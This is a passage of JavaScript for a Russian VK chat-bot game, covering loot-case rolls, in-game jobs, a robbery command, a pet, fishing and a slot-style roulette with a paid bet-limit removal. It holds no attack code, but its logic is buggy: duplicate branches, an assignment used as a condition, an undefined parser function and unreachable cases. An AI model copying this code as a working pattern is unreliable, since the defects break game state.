			return message.send(`📦 Открыв кейс, вы получили: 1500 рубинов !`);
		}
		if(rez == 32){
			let text = [].random(); 
			user.donate += 1500;
			return message.send(`📦 Открыв кейс, вы получили: 1500 рубинов !`);
		}
		if(rez == 33){
			let text = [].random(); 
			user.volff6 += 5;
			return message.send(`📦 Открыв кейс, вы получили: 5 раз бесплатной прокрутки данного кейса !`);
		}
		if(rez == 34){
			let text = [].random(); 
			user.volff6 += 5;
			return message.send(`📦 Открыв кейс, вы получили: 5 раз бесплатной прокрутки данного кейса !`);
		}
		if(rez == 35){
			let text = [].random(); 
			user.volff6 += 5;
			return message.send(`📦 Открыв кейс, вы получили: 5 раз бесплатной прокрутки данного кейса !`);
		}
		
		
	}); 
	vk.updates.hear(/^(?:Эоткрыть)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.aldfsfdsamin < 1) return message.send(`📦 У вас нет ни одной бесплатной прокрутки данного кейса !`);
		user.aldfsfdsamin -= 1;
		let rez = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43].random();
		if(rez == 1){
			let text = [].random(); 
			user.bitcoin += 500000;
			return message.send(`📦 Открыв кейс, вы получили: 500.000 биткоинов !`);
		}
		if(rez == 2){
			let text = [].random(); 
			user.donate += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 3){
			let text = [].random(); 
			user.aaa += 26;
			return message.send(`📦 Открыв кейс, вы получили: 26 метеорита !`);
		}
		if(rez == 4){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 5){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 6){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 7){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 8){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 9){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 10){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 11){
			let text = [].random(); 
			user.aaa += 26;
			return message.send(`📦 Открыв кейс, вы получили: 26 метеорита !`);
		}
		if(rez == 12){
			let text = [].random(); 
			user.aaa += 26;
			return message.send(`📦 Открыв кейс, вы получили: 26 метеорита !`);
		}
		if(rez == 13){
			let text = [].random(); 
			user.aaa += 26;
			return message.send(`📦 Открыв кейс, вы получили: 26 метеорита !`);
		}
		if(rez == 14){
			let text = [].random(); 
			user.balance += 100000000000;
			return message.send(`📦 Открыв кейс, вы получили: 100.000.000.000$ !`);
		}
		if(rez == 15){
			let text = [].random(); 
			user.aaa += 26;
			return message.send(`📦 Открыв кейс, вы получили: 26 метеорита !`);
		}
		if(rez == 16){
			let text = [].random(); 
			user.aaa += 26;
			return message.send(`📦 Открыв кейс, вы получили: 26 метеорита !`);
		}
		if(rez == 17){
			let text = [].random(); 
			user.qqq += 100000;
			return message.send(`📦 Открыв кейс, вы получили: 100.000 наркоты !`);
		}
		if(rez == 18){
			let text = [].random(); 
			user.qqq += 100000;
			return message.send(`📦 Открыв кейс, вы получили: 100.000 наркоты !`);
		}
		if(rez == 19){
			let text = [].random(); 
			user.qqq += 100000;
			return message.send(`📦 Открыв кейс, вы получили: 100.000 наркоты !`);
		}
		if(rez == 20){
			let text = [].random(); 
			user.qqq += 100000;
			return message.send(`📦 Открыв кейс, вы получили: 100.000 наркоты !`);
		}
		if(rez == 21){
			let text = [].random(); 
			user.qqq += 100000;
			return message.send(`📦 Открыв кейс, вы получили: 100.000 наркоты !`);
		}
		if(rez == 22){
			let text = [].random(); 
			user.qqq += 100000;
			return message.send(`📦 Открыв кейс, вы получили: 100.000 наркоты !`);
		}
		if(rez == 21){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 22){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 23){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 24){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 25){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 26){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 27){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 28){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 29){
			let text = [].random(); 
			user.bitcoin += 0;
			return message.send(`📦 Увы(\nВам нечего не выпало`);
		}
		if(rez == 30){
			let text = [].random(); 
			user.donate += 1500;
			return message.send(`📦 Открыв кейс, вы получили: 1500 рубинов !`);
		}
		if(rez == 31){
			let text = [].random(); 
			user.donate += 1500;
			return message.send(`📦 Открыв кейс, вы получили: 1500 рубинов !`);
		}
		if(rez == 32){
			let text = [].random(); 
			user.donate += 1500;
			return message.send(`📦 Открыв кейс, вы получили: 1500 рубинов !`);
		}
		if(rez == 33){
			let text = [].random(); 
			user.aldfsfdsamin += 1;
			return message.send(`📦 Открыв кейс, вы получили: 1 раз бесплатной прокрутки данного кейса !`);
		}
		if(rez == 34){
			let text = [].random(); 
			user.aldfsfdsamin += 1;
			return message.send(`📦 Открыв кейс, вы получили: 1 раз бесплатной прокрутки данного кейса !`);
		}
		if(rez == 35){
			let text = [].random(); 
			user.aldfsfdsamin += 2;
			return message.send(`📦 Открыв кейс, вы получили: 2 раз бесплатной прокрутки данного кейса !`);
		}
		if(rez == 36){
			let text = [].random(); 
			user.aldfsfdsamin += 2;
			return message.send(`📦 Открыв кейс, вы получили: 2 раз бесплатной прокрутки данного кейса !`);
		}
		if(rez == 37){
			let text = [].random(); 
			user.aldfsfdsamin += 2;
			return message.send(`📦 Открыв кейс, вы получили: 2 раз бесплатной прокрутки данного кейса !`);
		}

		if(rez == 38){
			let text = [].random(); 
			user.aldfsfdsamin += 2;
			return message.send(`📦 Открыв кейс, вы получили: 2 раз бесплатной прокрутки данного кейса !`);
		}

		if(rez == 39){
			let text = [].random(); 
			user.balance += 300000000;
			return message.send(`📦 Открыв кейс, вы получили: 300.000.000 $`);
		}

		if(rez == 40){
			let text = [].random(); 
			user.balance += 150000000;
			return message.send(`📦 Открыв кейс, вы получили: 150.000.000 $`);
		}

		if(rez == 41){
			let text = [].random(); 
			user.aldfsfdsamin += 3;
			return message.send(`📦 Открыв кейс, вы получили: + 3 прокрутки`);
		}

		if(rez == 42){
			let text = [].random(); 
			user.aldfsfdsamin += 2;
			return message.send(`📦 Открыв кейс, вы получили: 2 раз бесплатной прокрутки данного кейса !`);
		}

		if(rez == 43){
			let text = [].random(); 
			user.balance += 10000000000;
			return message.send(`📦 Открыв кейс, вы получили: 10.000.000.000 $`);
		}
		

		

		
	}); 
///









////


vk.updates.hear(/^(?:таксовать)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.cars == false) return message.send(`🚘 чтобы таксовать, вам нужен автомобиль !`);  
	if(user.alm565in  < 10) return message.send(`🚘 ➾ Не достаточно бензина ! " АЗС "`)
		if(user.bloks.sssss1 == true) return message.send(`🚘 Вы уже таксуите !`);
	user.bloks.sssss1 = true
	setTimeout(() => {
		user.bloks.sssss1 = false
		user.balance += 7000;
		vk.api.call('messages.send', {
			peer_id: user.id,
			message: `Вы закончили таксовать ! Вам зачислено 7000 $`, random_id: 0
		});
	}, 900000);
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance -= 0;
		return message.send(`Вы отправилисть таксовать !`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`Вы отправилисть таксовать !`);
	}
}); 

////


vk.updates.hear(/^(?:поход)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 2) return message.send(`❗ Доступно с 2 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(user.bloks.sssss143 == true) return message.send(`🌲 Вы уже сегодня ходили в поход !`);
	user.bloks.sssss143 = true
	setTimeout(() => {
		user.bloks.sssss143 = false
		vk.api.call('messages.send', {
			peer_id: user.id,
			message: ``, random_id: 0
		});
	}, 86400000);
	let rez = [1,2,3,4,5,6,7].random();
	if(rez == 1){
		let text = [].random(); 
		user.donate += 0;
		return message.send(`🌲 Вы нечего не нашли ((`);
	}
	if(rez == 2){
		let text = [].random(); 
		user.balance += 10000;
		return message.send(`🌲 Вы нашли 10.000 $`);
	}
	if(rez == 3){
		let text = [].random(); 
		user.aaa += 0;
		return message.send(`🌲 Вы нечего не нашли ((`);
	}
	if(rez == 4){
		let text = [].random(); 
		user.balance += 100000;
		return message.send(`🌲 Вы нашли 100.000 $ в кустах !`);
	}
	if(rez == 5){
		let text = [].random(); 
		user.balance += 9000;
		return message.send(`🌲 Вы нашли 9000 $ в кустах !`);
	}
	if(rez == 6){
		let text = [].random(); 
		user.bitcoin += 0;
		return message.send(`🌲 Вы нечего не нашли ((`);
	}
	if(rez == 7){
		let text = [].random(); 
		user.balance += 1000000;
		return message.send(`🌲 Вы нашли 1.000.000 $ в кустах !`);
	}
}); 
   
vk.updates.hear(/^(?:питомец поход)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.pit == false) return message.send(`🐻 У вас нет питомца !`); 
	if(user.bloks.sssss13 == true) return message.send(`🐻  Питомец уже ходил сегодня в поход ! Попробуйте через час !`);
	user.bloks.sssss13 = true
	setTimeout(() => {
		user.bloks.sssss13 = false
		vk.api.call('messages.send', {
			peer_id: user.id,
			message: `🐻 Ваш питомец отдохнул и может снова идти в поход !` , random_id: 0
		});
	}, 3600000);
	let rez = [1,2,3,4,5,6,7].random();
	if(rez == 1){
		let text = [].random(); 
		user.pit = false;
		return message.send(`🐻 Упс... Ваш питомец умер в походе ((`);
	}
	if(rez == 2){
		let text = [].random(); 
		user.donate += 10;
		return message.send(`🐻 Ваш питомец нашел 10 рубинов`);
	}
	if(rez == 3){
		let text = [].random(); 
		user.pit = false;
		return message.send(`🐻 Упс... Ваш питомец умер в походе ((`);
	}
	if(rez == 4){
		let text = [].random(); 
		user.balance += 800000;
		return message.send(`🐻 Ваш питомец нашел 800.000 $`);
	}
	if(rez == 5){
		let text = [].random(); 
		user.pit = false;
		return message.send(`🐻 Ваш питомец умер (((`);
	}
	if(rez == 6){
		let text = [].random(); 
		user.donate += 10;
		return message.send(`🐻 Ваш питомец нашел 10 рубинов`);
	}
	if(rez == 7){
		let text = [].random(); 
		user.donate += 10;
		return message.send(`🐻 Ваш питомец нашел 10 рубинов`);
	}
});   
vk.updates.hear(/^(?:питомец улучшить)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.pit == false) return message.send(`🐻 У вас нет питомца !`); 
	if(user.balance < 600000) return message.send(`У вас нет 600.000 !`);
	user.upis11114 += 1;
	user.balance -= 600000;
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance -= 0;
		return message.send(`🐻 Вы улучшили своего питомца ! Посмотреть " питинфо "`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`🐻 Вы улучшили своего питомца ! Посмотреть " питинфо "`);
	}
});   
vk.updates.hear(/^(?:чемодан)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.volftube7 < 1) return message.send(`💣 ➾ У вас нет чемодана`);
	user.volftube7 -= 1;
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance -= 0;
		return message.send(`Увы) Попался пустой чемодан )`);
	}else{ 
		let count = [700000000].random();
		user.balance += count;
		return message.send(`В чемодане вы нашли 700.000.000 $ !`);
	}
});  
vk.updates.hear(/^(?:удочка)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 1) return message.send(`❗ Доступно с 1 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(user.balance < 30000) return message.send(`У вас нет 30.000 $`);  
	user.balance -= 30000;
	user.kvest10 = true;
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance -= 0;
		return message.send(`Вы купили удочку !`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`Вы купили удочку !`);
	}
}); 

vk.updates.hear(/^(?:таксовать)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 5) return message.send(`❗ Доступно с 5 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(user.cars == false) return message.send(``);  
	if(user.bloks.sssss1 == true) return message.send(`🚘 Вы уже таксуите !`);
	user.bloks.sssss1 = true
	setTimeout(() => {
		user.bloks.sssss1 = false
		user.balance += 7000;
		vk.api.call('messages.send', {
			peer_id: user.id,
			message: `Вы закончили таксовать ! Вам зачислено 7000 $` , random_id: 0
		});
	}, 900000);
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance -= 0;
		return message.send(`Вы отправилисть таксовать !`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`Вы отправилисть таксовать !`);
	}
}); 
vk.updates.hear(/^(?:Летчик)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 3) return message.send(`❗ Доступно с 3 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(user.aircraft == false) return message.send(`У вас нет самолета !`);  
	if(user.bloks.gandon == true) return message.send(`Вас самолет уже отправился в путь !`);
	user.bloks.gandon = true
	setTimeout(() => {
		user.bloks.gandon = false
		user.balance += 200000;
		vk.api.call('messages.send', {
			peer_id: user.id,
			message: `Вы закончили работать летчиком и успешно заработали 200.000 $` , random_id: 0
		});
	}, 10800000);
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance -= 0;
		return message.send(`Работа летчика началась !`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`Работа летчика началась !`);
	}
}); 
vk.updates.hear(/^(?:Инкассатор)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 10) return message.send(`❗ Доступно с 10 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(user.gun_name == false)	 return message.send(`🔫 ➾ У вас нет оружия. ('Крутить')`)  
		if(user.ahahah < 100) return message.send(`У вас не достаточно здоровья !`); 
	if(user.bloks.muma == true) return message.send(`Попробуйте через 2 часа !`);
	user.bloks.muma = true
	setTimeout(() => {
		user.bloks.muma = false
		vk.api.call('messages.send', {
			peer_id: user.id,
			message: `` , random_id: 0
		});
	}, 7200000);
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance -= 0;
		user.ahahah -= 100;
		return message.send(`Увы... Вы не смогли ограбить инкассатор и вас убила охрана ! ( - 100 XP )`, { attachment: "photo-178754644_456239018" 
	}); 
	}else{ 
		let count = [100000,200000,300000,400000,500000,600000,1000000,600000,54023,543453,7567567,532445,14540].random();
		user.balance += count;
		user.upis10 += 1;
		return message.send(`💰💰💰💰💰 Вы смогли ограбить машину инкассаторов и получили ${count}$`);
	}
}); 
vk.updates.hear(/^(?:Спрятаться)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.fggg = 10;
		return message.send(`☕ Вы спрятались ! Для выхода , напишите " ввыход "`);
	}else{ 
		let count = [10].random();
		user.fggg = count;
		return message.send(`⛄ Вы спрятались ! Для выхода , напишите " ввыход "`);
	}
}); 
//////////////РУЛЕТКА BY VOLF
vk.updates.hear(/^(?:Рулетка)\s?([^\s ].*)?/i, message => {
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🎰 укажите ставку`);
	let amount = parserInt(message.$match[1]);
	if(!Number(amount) || amount < 0) return message.send(`🎰 ставка не число`);
	if(amount > acc.users[user_id(message.user)].balance) return message.send(`🎰 Ставка > баланса`);
	if(user.block_game == true && user.ap < 3){
		if (amount > 500000 && amount != acc.users[id].balance) return message.send(`🎉 ➾  Ставка не должна быть больше 500.000$\n⛔ ➾ В 'донат' можно купить снятие ограничения.`);
	}
	if(message.isChat) return message.send(`Данная команда доступна в личных сообщениях.`)
		amount = Math.round(amount);
	let text = '';
	let chat = message.user;

	vk.api.call('messages.send', {
		peer_id: chat,
		message: `🎰🎰🎰`, random_id: 0
	})
	.then((res) => {
		let rez = [
		{
			id: 1,
			smile: '💎💎💎',
			win: true
		},
		{
			id: 2,
			smile: '🔥🔥🔥',
			win: true
		},
		{
			id: 3,
			smile: '🔥⛔💎',
			win: false
		}
		]

		let chet = 0;
		for(i=700;i<4900;i+=700){
			let r = rez.random();
			setTimeout(() => {
				chet += 1;
				if(chet == 6){
					if(r.win == true){
						acc.users[user_id(message.user)].balance += Number(amount);
						vk.api.call('messages.edit', {
							peer_id: chat,
							message: r.smile+`\n🎰 Вы победили!\n💎 Вы выиграли: ${amount} 💰`,
							message_id: res
						})
						return;
					}else{
						acc.users[user_id(message.user)].balance -= Number(amount);
						vk.api.call('messages.edit', {
							peer_id: chat,
							message: r.smile+`\n🎰 Вы проиграли!\n💎 Вы проиграли: ${amount} 💰`,
							message_id: res
						})
						return;
					}
				}
				vk.api.call('messages.edit', {
					peer_id: chat,
					message: r.smile,
					message_id: res
				})
			}, i);
		}
	})
	.catch((error) => {console.log('err');
});
}); 

////
vk.updates.hear(/^(?:Ввыход)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.fggg = 0;
		return message.send(`⛄ Вы вышли из блокады !`);
	}else{ 
		let count = [0].random();
		user.fggg = count;
		return message.send(`⛄ Вы вышли из блокады !`);
	}
}); 
vk.updates.hear(/^(?:Слепить)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance -= 500000;
		return message.send(`❄ Вы рукожопик )) Вы не смогли слепить снежок ! Попробуйте еще !`);
	}else{ 
		let count = [1,2,3,4,5,6,1,2,3,7,1].random();
		user.perp += count;
		return message.send(`❄ Вы слепили ${count} снежков !`);
	}
});  
vk.updates.hear(/^(?:снеговик)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance -= 0;
		return message.send(`🌚 Увы ((( Вы не смогли слепить снеговика 🌝`);
	}else{ 
		let count = [10,20,30,40,50,60,70,80,90,100].random();
		user.balance += count;
		return message.send(`❄⛄ Вы слепили снеговика !(+ ${count}$ )`);
	}
});
vk.updates.hear(/^(?:zalupa)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.bloks.vivi == true) return message.send(`🎄 Новогодний кейс, можно открыть раз в 3 часа !`);
	user.bloks.vivi = true
	setTimeout(() => {
		user.bloks.vivi = false
		vk.api.call('messages.send', {
			peer_id: user.id,
			message: `🍷 Вам снова доступен новогодний бесплатный кейсик ! Чтобы открыть, напиши " нкейс "` , random_id: 0
		});
	}, 10800000);
	let rez = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25].random();
	if(rez == 1){
		let text = [].random(); 
		user.donate += 100;
		return message.send(`😃 Вам выпало 100 рубинов !`);
	}
	if(rez == 2){
		let text = [].random(); 
		user.donate += 50;
		return message.send(`😃 Вам выпало 50 рубинов !`);
	}
	if(rez == 3){
		let text = [].random(); 
		user.aaa += 1;
		return message.send(`😃 Вам выпал 1 метеорит !`);
	}
	if(rez == 4){
		let text = [].random(); 
		user.balance += 100000;
		return message.send(`😃 Вам выпало 100.000 $ !`);
	}
	if(rez == 5){
		let text = [].random(); 
		user.balance += 900000;
		return message.send(`😃 Вам выпало 900.000 $ !`);
	}
	if(rez == 6){
		let text = [].random(); 
		user.bitcoin += 5000;
		return message.send(`😃 Вам выпало 5000 биткоина !`);
	}
	if(rez == 7){
		let text = [].random(); 
		user.balance += 111111;
		return message.send(`😃 Вам выпало 111.111 $ !`);
	}
	if(rez == 8){
		let text = [].random(); 
		user.aaa += 3;
		return message.send(`😃 Вам выпало 3 метеорита`);
	}
	if(rez == 9){
		let text = [].random(); 
		user.donate += 90;
		return message.send(`😃 Вам выпало 90 рубинов !`);
	}
	if(rez == 10){
		let text = [].random(); 
		user.donate += 150;
		return message.send(`😃 Вам выпало 150 рубинов !`);
	}
	if(rez == 11){
		let text = [].random(); 
		user.donate += 200;
		return message.send(`😃 Вам выпало 200 рубинов !`);
	}
	if(rez == 12){
		let text = [].random(); 
		user.donate += 20;
		return message.send(`😃 Вам выпало 20 рубинов !`);
	}
	if(rez == 13){
		let text = [].random(); 
		user.donate += 70;
		return message.send(`😃 Вам выпало 70 рубинов !`);
	}
	if(rez == 14){
		let text = [].random(); 
		user.donate += 33;
		return message.send(`😃 Вам выпало 33 рубинов !`);
	}
	if(rez == 15){
		let text = [].random(); 
		user.balance += 100000;
		return message.send(`😃 Вам выпало 100.000 $ !`);
	}
	if(rez == 16){
		let text = [].random(); 
		user.balance += 100000;
		return message.send(`😃 Вам выпало 100.000 $ !`);
	}
	if(rez == 17){
		let text = [].random(); 
		user.balance += 100000;
		return message.send(`😃 Вам выпало 100.000 $ !`);
	}
	if(rez == 18){
		let text = [].random(); 
		user.balance += 20000000;
		return message.send(`😃 Вам выпало 20.000.000 $ !`);
	}
	if(rez == 19){
		let text = [].random(); 
		user.balance += 50034;
		return message.send(`😃 Вам выпало 50034 $ !`);
	}
	if(rez == 20){
		let text = [].random(); 
		user.balance += 23045;
		return message.send(`😃 Вам выпало 23045 $ !`);
	}
	if(rez == 21){
		let text = [].random(); 
		user.balance += 6765;
		return message.send(`😃 Вам выпало 6765 $ !`);
	}
	if(rez == 22){
		let text = [].random(); 
		user.balance += 50000000;
		return message.send(`😃 Вам выпало 50.000.000 $ !`);
	}
	if(rez == 23){
		let text = [].random(); 
		user.balance += 78982;
		return message.send(`😃 Вам выпало 78982 $ !`);
	}
	if(rez == 24){
		let text = [].random(); 
		user.balance += 782;
		return message.send(`😃 Вам выпало 782 $ !`);
	}
	if(rez == 25){
		let text = [].random(); 
		user.balance += 8;
		return message.send(`😃 Вам выпало 8 $ !`);
	}
	if(rez == 26){
		let text = [].random(); 
		user.balance += 8234;
		return message.send(`😃 Вам выпало 8234 $ !`);
	}
	if(rez == 27){
		let text = [].random(); 
		user.balance += 8;
		return message.send(`😃 Вам выпало 8 $ !`);
	}
	if(rez == 28){
		let text = [].random(); 
		user.balance += 86565;
		return message.send(`😃 Вам выпало 86565 $ !`);
	}
	if(rez == 29){
		let text = [].random(); 
		user.balance += 12000;
		return message.send(`😃 Вам выпало 12000 $ !`);
	}
	if(rez == 30){
		let text = [].random(); 
		user.bitcoin += 100;
		return message.send(`😃 Вам выпало 100 биткоинов !`);
	}
}); 
	vk.updates.hear(/^(?:Рыбачить)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.kvest10 = false) return message.send(`У вас нет удочки !`);
		let rez = [1,2,3,4,5,6,7,8,9].random();
		if(rez == 1){
			let text = [].random(); 
			return message.send(`Ловись ловись рыбка... Что-то не везет`);
		}
		if(rez == 2){
			let text = [].random(); 
			return message.send(`Ловись ловись рыбка... Что-то не везет`);
		}
		if(rez == 3){
			let text = [].random(); 
			return message.send(`Ловись ловись рыбка... Что-то не везет`);
		}
		if(rez == 4){
			let text = [].random(); 
			return message.send(`Ловись ловись рыбка... Что-то не везет`);
		}
		if(rez == 5){
			let text = [].random(); 
			user.fdsfsd += 1;
			return message.send(`Ловись ловись рыбка... Что-то не везет`);
		}
		if(rez == 6){
			let text = [].random(); 
			user.fdsfsd += 1;
			return message.send(`🐬 Ух) Вы поймали рыбку) ( +1)`);
		}
		if(rez == 7){
			let text = [].random(); 
			user.fdsfsd += 1;
			return message.send(`🐬 Ух) Вы поймали рыбку) ( +1)`);
		}
		if(rez == 8){
			let text = [].random(); 
			return message.send(`Что-то реально Вам не везет...`);
		}
		if(rez == 9){
			let text = [].random(); 
			return message.send(`Ловись ловись рыбка... Что-то не везет`);
		}
	}); 
	vk.updates.hear(/^(?:бургеркейс)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.upis65465465 < 2) return message.send(`❗ Доступно с 2 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
		if(user.balance < 1000000) return message.send(`💶У вас не достаточно денежных средств , для того, чтобы открыть данный кейс !`);
		user.balance -= 1000000;
		let rez = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19].random();
		if(rez == 1){
			let text = [].random(); 
			user.balance += 1500000;
			return message.send(`👓 Вам выпало 1.500.000 $ !`);
		}
		if(rez == 2){
			let text = [].random(); 
			user.balance += 1500000;
			return message.send(`👓 Вам выпало 1.500.000 $ !`);
		}
		if(rez == 3){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 4){
			let text = [].random(); 
			user.balance += 2500000;
			return message.send(`👓 Вам выпало 2.500.000 $ !`);
		}
		if(rez == 5){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 6){
			let text = [].random(); 
			user.balance += 1500000;
			return message.send(`👓 Вам выпало 1.500.000 $ !`);
		}
		if(rez == 7){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 8){
			let text = [].random(); 
			user.balance += 1500000;
			return message.send(`👓 Вам выпало 1.500.000 $ !`);
		}
		if(rez == 9){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 10){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 11){
			let text = [].random(); 
			user.balance += 1500000;
			return message.send(`👓 Вам выпало 1.500.000 $ !`);
		}
		if(rez == 12){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 13){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 14){
			let text = [].random(); 
			user.balance += 4500000;
			return message.send(`👓 Вам выпало 4.500.000 $ !`);
		}
		if(rez == 15){
			let text = [].random(); 
			user.balance += 4500000;
			return message.send(`👓 Вам выпало 4.500.000 $ !`);
		}
		if(rez == 16){
			let text = [].random(); 
			user.balance += 6500000;
			return message.send(`👓 Вам выпало 6.500.000 $ !`);
		}
		if(rez == 17){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 18){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 19){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
	}); 
	vk.updates.hear(/^(?:мажоркейс)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.upis65465465 < 2) return message.send(`❗ Доступно с 2 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
		if(user.balance < 5000000) return message.send(`💶У вас не достаточно денежных средств , для того, чтобы открыть данный кейс !`);
		user.balance -= 5000000;
		let rez = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19].random();
		if(rez == 1){
			let text = [].random(); 
			user.balance += 6000000;
			return message.send(`👓 Вам выпало 6.000.000 $ !`);
		}
		if(rez == 2){
			let text = [].random(); 
			user.balance += 6000000;
			return message.send(`👓 Вам выпало 6.000.000 $ !`);
		}
		if(rez == 3){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 4){
			let text = [].random(); 
			user.balance += 7000000;
			return message.send(`👓 Вам выпало 7.000.000 $ !`);
		}
		if(rez == 5){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 6){
			let text = [].random(); 
			user.balance += 6000000;
			return message.send(`👓 Вам выпало 6.000.000 $ !`);
		}
		if(rez == 7){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 8){
			let text = [].random(); 
			user.balance += 6000000;
			return message.send(`👓 Вам выпало 6.000.000 $ !`);
		}
		if(rez == 9){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 10){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 11){
			let text = [].random(); 
			user.balance += 6000000;
			return message.send(`👓 Вам выпало 6.000.000 $ !`);
		}
		if(rez == 12){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 13){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 14){
			let text = [].random(); 
			user.balance += 7000000;
			return message.send(`👓 Вам выпало 7.000.000 $ !`);
		}
		if(rez == 15){
			let text = [].random(); 
			user.balance += 7000000;
			return message.send(`👓 Вам выпало 7.000.000 $ !`);
		}
		if(rez == 16){
			let text = [].random(); 
			user.balance += 8000000;
